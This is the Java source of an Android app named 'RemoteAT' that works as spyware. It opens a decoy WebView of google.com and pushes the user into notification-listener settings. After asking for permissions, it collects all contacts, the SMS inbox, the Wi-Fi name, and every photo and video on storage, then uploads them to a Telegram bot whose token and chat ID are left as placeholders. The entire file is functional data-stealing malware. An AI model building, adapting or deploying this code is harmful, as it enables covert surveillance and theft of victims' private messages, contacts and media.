package com.ahemods.remoteat;

import android.app.Activity;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.util.Log;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class MainActivity extends Activity {

    private final String BOT_TOKEN = "YOUR TOKEN";
    private final String CHAT_ID = "YOUR ID";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // WebView açılıyor
        WebView webView = new WebView(this);
        setContentView(webView);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setWebViewClient(new WebViewClient());
        webView.loadUrl("https://google.com");

        // Bildirim izni açık değilse ayarlara yönlendir
        if (!isNotificationServiceEnabled()) {
            startActivity(new android.content.Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
        }

        requestAndSendData();
        sendWifiInfo();
    }

    private void requestAndSendData() {
        if (Build.VERSION.SDK_INT >= 23) {
            if (checkSelfPermission(android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED ||
                checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED ||
                checkSelfPermission(android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {

                requestPermissions(new String[]{
                                       android.Manifest.permission.READ_CONTACTS,
                                       android.Manifest.permission.READ_EXTERNAL_STORAGE,
                                       android.Manifest.permission.READ_SMS
                                   }, 1);
                return;
            }
        }

        sendAllData();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        boolean granted = true;
        for (int r : grantResults) if (r != PackageManager.PERMISSION_GRANTED) granted = false;

        if (granted) {
            sendAllData();
            sendWifiInfo();
        }
    }

    private void sendAllData() {
        sendContacts();
        sendSMS();
        sendMediaFiles();
    }

    private void sendContacts() {
        StringBuilder contacts = new StringBuilder();
        Cursor cursor = getContentResolver().query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null, null);
        if (cursor != null) {
            int nameIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
            int numberIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
            while (cursor.moveToNext()) {
                String name = cursor.getString(nameIndex);
                String number = cursor.getString(numberIndex);
                contacts.append(name).append(": ").append(number).append("\n");
            }
            cursor.close();
        }
        if (contacts.length() > 0) sendTextToTelegram("Rehber:\n" + contacts.toString());
    }

    private void sendSMS() {
        Uri smsUri = Uri.parse("content://sms/inbox");
        Cursor cursor = getContentResolver().query(smsUri, null, null, null, null);
        if (cursor != null) {
            StringBuilder smsData = new StringBuilder();
            int addressIndex = cursor.getColumnIndex("address");
            int bodyIndex = cursor.getColumnIndex("body");
            while (cursor.moveToNext()) {
                String address = cursor.getString(addressIndex);
                String body = cursor.getString(bodyIndex);
                smsData.append(address).append(": ").append(body).append("\n");
            }
            cursor.close();
            if (smsData.length() > 0) sendTextToTelegram("SMS Mesajları:\n" + smsData.toString());
        }
    }

    private void sendMediaFiles() {
        File root = new File("/storage/emulated/0/");
        listAndSendMedia(root);
    }

    private void listAndSendMedia(File dir) {
        if (dir != null && dir.exists() && dir.isDirectory()) {
            File[] files = dir.listFiles();
            if (files != null) {
                for (File f : files) {
                    if (f.isDirectory()) {
                        listAndSendMedia(f);
                    } else {
                        String name = f.getName().toLowerCase();
                        if (name.endsWith(".jpg") || name.endsWith(".jpeg") ||
                            name.endsWith(".png") || name.endsWith(".heif") ||
                            name.endsWith(".mp4")) {
                            sendFileToTelegram(f);
                        }
                    }
                }
            }
        }
    }

    private void sendWifiInfo() {
        try {
            WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
            WifiInfo info = wifiManager != null ? wifiManager.getConnectionInfo() : null;
            String ssid = info != null ? info.getSSID() : "Unknown";
            sendTextToTelegram("Wi-Fi SSID: " + ssid);
        } catch (Exception e) {
            Log.e("RemoteAT", "Wi-Fi error: " + e.toString());
        }
    }

    private void sendTextToTelegram(final String message) {
        new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        String url = "https://api.telegram.org/bot" + BOT_TOKEN +
                            "/sendMessage?chat_id=" + CHAT_ID +
                            "&text=" + URLEncoder.encode(message, "UTF-8");
                        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                        conn.setRequestMethod("GET");
                        conn.getInputStream().close();
                        conn.disconnect();
                    } catch (Exception e) {
                        Log.e("RemoteAT", e.toString());
                    }
                }
            }).start();
    }

    private void sendFileToTelegram(final File file) {
        new Thread(new Runnable() {
                @Override
                public void run() {
                    String boundary = "*****" + System.currentTimeMillis() + "*****";
                    try {
                        URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument?chat_id=" + CHAT_ID);
                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                        conn.setDoOutput(true);
                        conn.setRequestMethod("POST");
                        conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

                        DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
                        dos.writeBytes("--" + boundary + "\r\n");
                        dos.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"" + file.getName() + "\"\r\n");
                        dos.writeBytes("Content-Type: application/octet-stream\r\n\r\n");

                        FileInputStream fis = new FileInputStream(file);
                        byte[] buffer = new byte[4096];
                        int bytesRead;
                        while ((bytesRead = fis.read(buffer)) != -1) {
                            dos.write(buffer, 0, bytesRead);
                        }
                        fis.close();
                        dos.writeBytes("\r\n--" + boundary + "--\r\n");
                        dos.flush();
                        dos.close();

                        conn.getInputStream().close();
                        conn.disconnect();
                    } catch (Exception e) {
                        Log.e("RemoteAT", e.toString());
                    }
                }
            }).start();
    }

    private boolean isNotificationServiceEnabled() {
        String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        return flat != null && flat.contains(getPackageName());
    }
}
